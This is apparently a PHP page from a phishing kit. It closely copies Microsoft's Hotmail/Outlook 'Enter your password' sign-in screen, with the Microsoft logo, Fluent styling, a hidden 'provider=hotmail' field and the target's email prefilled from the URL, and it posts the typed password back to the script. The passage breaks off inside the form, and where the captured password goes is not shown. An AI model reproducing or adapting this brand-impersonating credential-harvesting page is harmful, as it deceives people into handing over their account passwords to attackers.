<?php
// Get email from URL or session
$email = $_GET['email'] ?? '';
if (empty($email)) {
    // Try to get from JavaScript session storage via cookie or hidden input
    $email = $_POST['email'] ?? '';
}
?>
<html>
<title>Enter your password</title>
<head>
    <link rel="icon" type="image/x-icon" href="/assets/hotmail/favicon.ico">
    <style>
        .style-0 {
            cursor: auto;
            box-sizing: border-box;
            display: block;
        }

        .style-1 {
            min-height: 1px;
            box-sizing: border-box;
        }

        .style-2 {
            --borderRadiusNone: 0;
            --borderRadiusSmall: 2px;
            --borderRadiusMedium: 4px;
            --borderRadiusLarge: 6px;
            --borderRadiusXLarge: 8px;
            --borderRadiusCircular: 10000px;
            --fontSizeBase100: 10px;
            --fontSizeBase200: 12px;
            --fontSizeBase300: 14px;
            --fontSizeBase400: 16px;
            --fontSizeBase500: 20px;
            --fontSizeBase600: 24px;
            --fontSizeHero700: 28px;
            --fontSizeHero800: 32px;
            --fontSizeHero900: 40px;
            --fontSizeHero1000: 68px;
            --lineHeightBase100: 14px;
            --lineHeightBase200: 16px;
            --lineHeightBase300: 20px;
            --lineHeightBase400: 22px;
            --lineHeightBase500: 28px;
            --lineHeightBase600: 32px;
            --lineHeightHero700: 36px;
            --lineHeightHero800: 40px;
            --lineHeightHero900: 52px;
            --lineHeightHero1000: 92px;
            --fontFamilyBase: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            --fontFamilyMonospace: Consolas, 'Courier New', Courier, monospace;
            --fontFamilyNumeric: Bahnschrift, 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            --fontWeightRegular: 400;
            --fontWeightMedium: 500;
            --fontWeightSemibold: 600;
            --fontWeightBold: 700;
            --strokeWidthThin: 1px;
            --strokeWidthThick: 2px;
            --strokeWidthThicker: 3px;
            --strokeWidthThickest: 4px;
            --spacingHorizontalNone: 0;
            --spacingHorizontalXXS: 2px;
            --spacingHorizontalXS: 4px;
            --spacingHorizontalSNudge: 6px;
            --spacingHorizontalS: 8px;
            --spacingHorizontalMNudge: 10px;
            --spacingHorizontalM: 12px;
            --spacingHorizontalL: 16px;
            --spacingHorizontalXL: 20px;
            --spacingHorizontalXXL: 24px;
            --spacingHorizontalXXXL: 32px;
            --spacingVerticalNone: 0;
            --spacingVerticalXXS: 2px;
            --spacingVerticalXS: 4px;
            --spacingVerticalSNudge: 6px;
            --spacingVerticalS: 8px;
            --spacingVerticalMNudge: 10px;
            --spacingVerticalM: 12px;
            --spacingVerticalL: 16px;
            --spacingVerticalXL: 20px;
            --spacingVerticalXXL: 24px;
            --spacingVerticalXXXL: 32px;
            --durationUltraFast: 50ms;
            --durationFaster: 100ms;
            --durationFast: 150ms;
            --durationNormal: 200ms;
            --durationGentle: 250ms;
            --durationSlow: 300ms;
            --durationSlower: 400ms;
            --durationUltraSlow: 500ms;
            --curveAccelerateMax: cubic-bezier(0.9, 0.1, 1, 0.2);
            --curveAccelerateMid: cubic-bezier(1, 0, 1, 1);
            --curveAccelerateMin: cubic-bezier(0.8, 0, 0.78, 1);
            --curveDecelerateMax: cubic-bezier(0.1, 0.9, 0.2, 1);
            --curveDecelerateMid: cubic-bezier(0, 0, 0, 1);
            --curveDecelerateMin: cubic-bezier(0.33, 0, 0.1, 1);
            --curveEasyEaseMax: cubic-bezier(0.8, 0, 0.2, 1);
            --curveEasyEase: cubic-bezier(0.33, 0, 0.67, 1);
            --curveLinear: cubic-bezier(0, 0, 1, 1);
            --colorNeutralForeground1: #242424;
            --colorNeutralForeground2: #424242;
            --colorNeutralForeground3: #616161;
            --colorNeutralForeground4: #707070;
            --colorBrandForegroundLink: #115ea3;
            --colorNeutralBackground1: #ffffff;
            --colorBrandBackground: #0f6cbd;
            --colorBrandBackgroundHover: #115ea3;
            --colorNeutralStroke1: #d1d1d1;
            --colorNeutralStroke2: #e0e0e0;
            --shadow16: 0 0 2px rgba(0, 0, 0, 0.12), 0 8px 16px rgba(0, 0, 0, 0.14);
            box-sizing: border-box;
            line-height: 20px;
            font-weight: 400;
            font-size: 14px;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            text-align: left;
            background-color: rgb(255, 255, 255);
            color: rgb(36, 36, 36);
        }

        .style-3 {
            box-sizing: border-box;
        }

        .style-5 {
            box-sizing: border-box;
        }

        .style-6 {
            background-color: rgb(245, 245, 245);
            grid-template-rows: 1fr auto;
            bottom: 0px;
            display: grid;
            right: 0px;
            left: 0px;
            top: 0px;
            height: 100vh;
            width: 100%;
            position: absolute;
            box-sizing: border-box;
        }

        .style-7 {
            object-fit: cover;
            object-position: 50% 50%;
            display: block;
            box-sizing: border-box;
            position: fixed;
            height: 100vh;
            width: 100%;
            border-radius: 0px;
        }

        .style-8 {
            padding-bottom: 32px;
            padding-left: 0px;
            padding-right: 0px;
            padding-top: 40px;
            flex-direction: column;
            justify-content: center;
            display: flex;
            box-sizing: border-box;
        }

        .style-9 {
            border-top-left-radius: 12px;
            border-top-right-radius: 12px;
            border-bottom-left-radius: 12px;
            border-bottom-right-radius: 12px;
            padding-bottom: 40px;
            padding-left: 40px;
            padding-right: 40px;
            margin-bottom: 0px;
            margin-left: auto;
            margin-right: auto;
            margin-top: 0px;
            box-shadow: rgba(0, 0, 0, 0.12) 0px 0px 2px 0px, rgba(0, 0, 0, 0.14) 0px 8px 16px 0px;
            align-items: center;
            width: 440px;
            position: relative;
            z-index: 1;
            padding-top: 40px;
            flex-direction: column;
            display: flex;
            box-sizing: border-box;
            background-color: rgb(255, 255, 255);
        }

        .style-11 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-12 {
            height: 332px;
            box-sizing: border-box;
        }

        .style-13 {
            box-sizing: border-box;
        }

        .style-14 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-15 {
            grid-template-columns: 1fr auto 1fr;
            display: grid;
            width: 100%;
            padding-bottom: 32px;
            box-sizing: border-box;
        }

        .style-16 {
            max-width: 24px;
            min-width: 24px;
            border-bottom-color: rgba(0, 0, 0, 0);
            border-left-color: rgba(0, 0, 0, 0);
            border-right-color: rgba(0, 0, 0, 0);
            border-top-color: rgba(0, 0, 0, 0);
            background-color: rgba(0, 0, 0, 0);
            line-height: 16px;
            font-size: 12px;
            color: rgb(66, 66, 66);
            box-sizing: border-box;
            font-weight: 400;
            padding: 1px;
            border-radius: 4px;
            align-items: center;
            display: flex;
            justify-content: center;
            text-decoration-line: none;
            vertical-align: middle;
            margin: 0px;
            overflow: hidden;
            border: 1px solid rgba(0, 0, 0, 0);
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            outline-style: none;
            transition-duration: 0.1s;
            transition-property: background, border, color;
            transition-timing-function: cubic-bezier(0.33, 0, 0.67, 1);
            cursor: pointer;
        }

        .style-17 {
            --fui-Button__icon--spacing: 4px;
            width: 20px;
            height: 20px;
            font-size: 20px;
            box-sizing: border-box;
            align-items: center;
            display: flex;
            justify-content: center;
        }

        .style-18 {
            line-height: 0px;
            display: none;
            box-sizing: border-box;
        }

        .style-19 {
            box-sizing: border-box;
        }

        .style-20 {
            line-height: 0px;
            display: block;
            box-sizing: border-box;
        }

        .style-21 {
            box-sizing: border-box;
        }

        .style-22 {
            box-sizing: border-box;
        }

        .style-28 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-29 {
            box-sizing: border-box;
        }

        .style-30 {
            margin-bottom: 16px;
            position: relative;
            justify-content: center;
            display: flex;
            box-sizing: border-box;
        }

        .style-31 {
            display: inline-flex;
            box-sizing: border-box;
            align-items: center;
            justify-content: center;
            position: relative;
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: var(--fontWeightRegular);
            line-height: var(--lineHeightBase300);
            min-width: max-content;
            padding: 8px 12px;
            border-radius: var(--borderRadiusMedium);
            border: 1px solid rgb(209, 209, 209);
            background-color: rgb(245, 245, 245);
            color: rgb(36, 36, 36);
            cursor: pointer;
            transition-duration: var(--durationFast);
            transition-property: background, border, color;
            transition-timing-function: var(--curveEasyEase);
        }

        .style-31:hover {
            background-color: rgb(240, 240, 240);
            border-color: rgb(200, 200, 200);
        }

        .style-31::after {
            content: "";
            position: absolute;
            bottom: -1px;
            left: 0;
            right: 0;
            height: 2px;
            background-color: rgb(15, 108, 189);
            border-radius: 0 0 var(--borderRadiusMedium) var(--borderRadiusMedium);
            transform: scaleX(0);
            transition-property: transform;
            transition-duration: var(--durationNormal);
            transition-timing-function: var(--curveDecelerateMid);
        }

        .style-31:hover::after {
            transform: scaleX(1);
        }

        .style-32 {
            box-sizing: border-box;
        }

        .style-33 {
            box-sizing: border-box;
        }

        .style-34 {
            text-align: center;
            position: relative;
            justify-content: center;
            box-sizing: border-box;
        }

        .style-35 {
            text-overflow: clip;
            white-space: normal;
            line-height: 32px;
            display: inline;
            text-align: center;
            font-weight: 600;
            font-size: 24px;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            color: rgb(36, 36, 36);
            overflow: visible;
        }

        .style-63 {
            padding-top: 32px;
            box-sizing: border-box;
        }

        .style-64 {
            width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-65 {
            display: grid;
            box-sizing: border-box;
        }

        .style-66 {
            min-height: 40px;
            min-width: 0px;
            padding-left: 8px;
            padding-right: 8px;
            column-gap: 0px;
            padding-bottom: 0px;
            line-height: 22px;
            font-size: 16px;
            padding-top: 0px;
            box-sizing: border-box;
            font-weight: 400;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            gap: 6px 0px;
            display: flex;
            align-items: center;
            flex-wrap: nowrap;
            border-radius: 4px;
            position: relative;
            vertical-align: middle;
            background-color: rgb(255, 255, 255);
            border-top-color: rgb(209, 209, 209);
            border-top-style: solid;
            border-top-width: 1px;
            border-right-color: rgb(209, 209, 209);
            border-right-style: solid;
            border-right-width: 1px;
            border-bottom-style: solid;
            border-bottom-width: 1px;
            border-left-color: rgb(209, 209, 209);
            border-left-style: solid;
            border-left-width: 1px;
            border-bottom-color: rgb(97, 97, 97);
        }

        .style-67 {
            display: block;
            box-sizing: border-box;
            color: rgb(97, 97, 97);
        }

        .style-68 {
            width: max-content;
            cursor: text;
            color: rgb(112, 112, 112);
            padding-bottom: 0px;
            padding-right: 4px;
            padding-left: 4px;
            padding-top: 0px;
            position: relative;
            box-sizing: border-box;
            line-height: 20px;
            font-size: 14px;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background-color: rgb(255, 255, 255);
            transition-timing-function: cubic-bezier(0, 0, 0, 1);
            transition-duration: 0.2s;
            transition-property: all;
        }

        /* Label naik saat focus atau ada value */
        .style-66:focus-within .style-68,
        .style-66.has-value .style-68 {
            top: 7px;
            right: 8px;
            left: 8px;
            line-height: 14px;
            transform: matrix(1, 0, 0, 1, 0, -14);
            font-size: 10px;
            position: absolute;
        }

        .style-69 {
            padding-right: 6px;
            padding-left: 6px;
            flex-shrink: 99;
            flex-basis: 0px;
            box-sizing: border-box;
            align-self: stretch;
            flex-grow: 1;
            min-width: 0px;
            border-style: none;
            color: rgb(36, 36, 36);
            background-color: rgba(0, 0, 0, 0);
            outline-style: none;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            font-size: 16px;
            font-weight: 400;
            line-height: 22px;
        }

        .style-70 {
            box-sizing: border-box;
            color: rgb(97, 97, 97);
            display: flex;
        }

        .style-71 {
            display: none;
            max-width: 24px;
            min-width: 24px;
            border-bottom-color: rgba(0, 0, 0, 0);
            border-left-color: rgba(0, 0, 0, 0);
            border-right-color: rgba(0, 0, 0, 0);
            border-top-color: rgba(0, 0, 0, 0);
            background-color: rgba(0, 0, 0, 0);
            line-height: 16px;
            font-size: 12px;
            color: rgb(66, 66, 66);
            box-sizing: border-box;
            font-weight: 400;
            padding: 1px;
            border-radius: 4px;
            align-items: center;
            justify-content: center;
            text-decoration-line: none;
            vertical-align: middle;
            margin: 0px;
            overflow: hidden;
            border: 1px solid rgba(0, 0, 0, 0);
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            outline-style: none;
            transition-duration: 0.1s;
            transition-property: background, border, color;
            transition-timing-function: cubic-bezier(0.33, 0, 0.67, 1);
        }

        .style-72 {
            --fui-Button__icon--spacing: 4px;
            width: 20px;
            height: 20px;
            font-size: 20px;
            box-sizing: border-box;
            align-items: center;
            display: inline-flex;
            justify-content: center;
        }

        .style-73 {
            line-height: 0px;
            display: block;
            box-sizing: border-box;
        }

        .style-74 {
            box-sizing: border-box;
        }

        .style-75 {
            box-sizing: border-box;
            margin-top: 2px;
            color: rgb(97, 97, 97);
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            font-size: 12px;
            font-weight: 400;
            line-height: 16px;
        }

        .style-76 {
            row-gap: 12px;
            padding-top: 32px;
            flex-direction: column;
            display: flex;
            box-sizing: border-box;
        }

        .style-77 {
            max-width: 100%;
            padding-bottom: 8px;
            padding-left: 16px;
            padding-right: 16px;
            padding-top: 8px;
            min-width: 96px;
            color: rgb(255, 255, 255);
            border-bottom-color: rgba(0, 0, 0, 0);
            border-left-color: rgba(0, 0, 0, 0);
            border-right-color: rgba(0, 0, 0, 0);
            border-top-color: rgba(0, 0, 0, 0);
            background-color: rgb(15, 108, 189);
            font-weight: 600;
            justify-content: center;
            display: flex;
            box-sizing: border-box;
            line-height: 20px;
            font-size: 14px;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            padding: 8px 16px;
            border-radius: 4px;
            align-items: center;
            text-decoration-line: none;
            vertical-align: middle;
            margin: 0px;
            overflow: hidden;
            border: 1px solid rgba(0, 0, 0, 0);
            outline-style: none;
            transition-duration: 0.1s;
            transition-property: background, border, color;
            transition-timing-function: cubic-bezier(0.33, 0, 0.67, 1);
            cursor: pointer;
        }

        .style-77:hover {
            background-color: #115ea3;
        }

        .style-82 {
            display: flex;
            box-sizing: border-box;
            background-color: rgb(255, 255, 255);
        }

        .style-83 {
            margin-bottom: 0px;
            margin-left: 0px;
            margin-right: 0px;
            margin-top: 0px;
            background-color: rgba(255, 255, 255, 0.5);
            row-gap: 12px;
            padding-bottom: 0px;
            padding-left: 24px;
            padding-right: 24px;
            min-height: 24px;
            z-index: 2;
            line-height: 22px;
            padding-top: 0px;
            bottom: 0px;
            color: rgb(66, 66, 66);
            left: 0px;
            width: 100%;
            flex-direction: column;
            display: flex;
            box-sizing: border-box;
        }

        .style-84 {
            column-gap: 24px;
            flex-shrink: 0;
            flex-wrap: wrap;
            row-gap: 12px;
            width: 100%;
            justify-content: center;
            display: flex;
            box-sizing: border-box;
        }

        .style-86 {
            user-select: text;
            text-overflow: clip;
            text-decoration-thickness: 1px;
            text-decoration-line: none;
            cursor: pointer;
            background-color: rgba(0, 0, 0, 0);
            height: 12px;
            display: block;
            line-height: 22px;
            font-size: 12px;
            box-sizing: border-box;
            color: rgb(66, 66, 66);
            position: relative;
            font-weight: 400;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            text-align: left;
            overflow: visible;
            padding: 0px;
            margin: 0px;
        }

        .style-87 {
            user-select: text;
            text-overflow: clip;
            text-decoration-thickness: 1px;
            text-decoration-line: none;
            cursor: pointer;
            background-color: rgba(0, 0, 0, 0);
            height: 12px;
            display: block;
            line-height: 22px;
            font-size: 12px;
            box-sizing: border-box;
            color: rgb(66, 66, 66);
            position: relative;
            font-weight: 400;
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            text-align: left;
            overflow: visible;
            padding: 0px;
            margin: 0px;
        }

        .error-message {
            color: #d13438;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .password-error {
            border-bottom-color: #d13438 !important;
        }

        @media screen and (max-width:600px) {
            .style-6 {
                background-color: #fff;
            }
            .style-9 {
                box-shadow: none !important;
                padding: 24px !important;
                width: unset !important;
                max-width: unset !important;
            }
        }
    </style>
</head>

<body data-tabster='{"root":{}}' class="style-0">
    <div class="style-1">
        <div dir="ltr" class="style-2">
            <div data-testid="app-boundary" class="style-3">
                <div data-testid="lightbox-layout" class="style-5">
                    <div data-testid="outer" class="style-6" role="presentation">
                        <img src="/assets/hotmail/fluent_web_light_2_145a07dcb971527a82b8.svg" class="style-7" role="presentation" />
                        <div class="style-8" role="main">
                            <div data-testid="inner" class="style-9">
                                <div data-testid="routeAnimationFluent" class="style-11">
                                    <div class="style-12">
                                        <div data-testid="heightAnimationFluent" class="style-13">
                                            <form data-testid="passwordEntryForm" novalidate="" spellcheck="false" method="post" autocomplete="off" class="style-14" id="loginForm">
                                                <input type="hidden" name="provider" value="hotmail">
                                                <input type="hidden" name="email" id="emailField" value="<?php echo htmlspecialchars($email); ?>">
                                                
                                                <div data-testid="banner" class="style-15">
                                                    <button type="button" data-testid="leftArrowIcon" aria-label="Back" class="style-16" onclick="window.history.back()">
                                                        <span class="style-17">
                                                            <svg class="style-18" fill="var(--colorNeutralForeground3)" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                                <path d="M10.73 19.8a.75.75 0 0 0 1.04-1.1l-6.25-5.95h14.73a.75.75 0 0 0 0-1.5H5.52l6.25-5.95a.75.75 0 0 0-1.04-1.1l-7.42 7.08a1 1 0 0 0 0 1.44l7.42 7.07Z" fill="var(--colorNeutralForeground3)" class="style-19"></path>
                                                            </svg>
                                                            <svg class="style-20" fill="var(--colorNeutralForeground3)" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                                <path d="M10.3 19.72a1 1 0 0 0 1.4-1.43L6.33 13H20a1 1 0 0 0 0-2H6.33l5.37-5.28a1 1 0 0 0-1.4-1.42l-6.93 6.82c-.5.5-.5 1.3 0 1.78l6.92 6.83Z" fill="var(--colorNeutralForeground3)" class="style-21"></path>
                                                            </svg>
                                                        </span>
                                                    </button>
                                                    <svg aria-label="Microsoft" data-testid="microsoftLogo" role="img" width="114" height="24" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#737373"></path><path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"></path><path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"></path><path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"></path><path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"></path></svg>
                                                </div>
                                                <div class="style-28">
                                                    <div class="style-29">
                                                        <div class="style-30">
                                                            <div data-testid="identityBanner" aria-label="<?php echo htmlspecialchars($email ?: 'user@example.com'); ?>" style="--phoenix-btn-color: #31374a;--phoenix-btn-bg: transparent;--phoenix-btn-border-color: #e3e6ed;--phoenix-btn-hover-color: #222834;--phoenix-btn-hover-bg: transparent;--phoenix-btn-hover-border-color: #e6e9ef;--phoenix-btn-focus-shadow-rgb: 200, 204, 213;--phoenix-btn-active-color: #31374a;--phoenix-btn-active-bg: transparent;--phoenix-btn-active-border-color: #e6e9ef;--phoenix-btn-active-shadow: initial;--phoenix-btn-disabled-color: #000000;--phoenix-btn-disabled-bg: transparent;--phoenix-btn-disabled-border-color: #e3e6ed;--phoenix-btn-padding-y: 0.5rem;--phoenix-btn-padding-x: 1rem;--phoenix-btn-font-size: 0.8rem;--phoenix-btn-border-radius: 0.375rem;color:rgb(34, 40, 52);text-decoration:none solid rgb(34, 40, 52);background-color:transparent;border-color:rgb(230, 233, 239);--phoenix-btn-font-family:;--phoenix-btn-font-weight: 400;--phoenix-btn-line-height: 1.2;--phoenix-btn-border-width: 1px;--phoenix-btn-box-shadow: initial;--phoenix-btn-disabled-opacity: 0.3;--phoenix-btn-focus-box-shadow: 0 0 0 0 rgba(200, 204, 213, .5);display:inline-block;padding:10px 18px;font-family:'Nunito Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';font-size:14px;font-weight:400;line-height:16px;text-align:center;vertical-align:middle;cursor:pointer;user-select:none;border:1px solid rgb(230, 233, 239);border-radius:800px;box-shadow:none;transition:color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;scroll-margin-top:104px;margin-bottom:4px;margin-right:4px;appearance:button;text-transform:none;margin:0px 4px 4px 0px;outline:rgb(34, 40, 52) none 0px;box-sizing:border-box;">
                                                                <div id="userEmailDisplay"><?php echo htmlspecialchars($email ?: 'user@example.com'); ?></div>
                                                            </div>
                                                        </div>
                                                        <div aria-live="polite" class="style-33">
                                                            <div class="style-34">
                                                                <h1 class="style-35" data-testid="title">Enter your password</h1>
                                                            </div>
                                                        </div>
                                                        <div class="style-63">
                                                            <div data-testid="passwordEntry" class="style-64">
                                                                <div class="style-65">
                                                                    <span class="style-66">
                                                                        <span class="style-67">
                                                                            <label for="passwordEntry" class="style-68">Password</label>
                                                                        </span>
                                                                        <input type="password" name="password" autocomplete="current-password" placeholder="" aria-describedby="passwordError" class="style-69" value="" id="passwordEntry" />
                                                                        <span class="style-70">
                                                                            <button type="button" aria-label="Show password" class="style-71">
                                                                                <span class="style-72">
                                                                                    <svg data-testid="password-eye-on" fill="currentColor" class="style-73" aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                                                        <path d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z" fill="currentColor" class="style-74"></path>
                                                                                    </svg>
                                                                                </span>
                                                                            </button>
                                                                        </span>
                                                                    </span>
                                                                    <div class="style-75">
                                                                        <div id="passwordError" class="error-message"></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
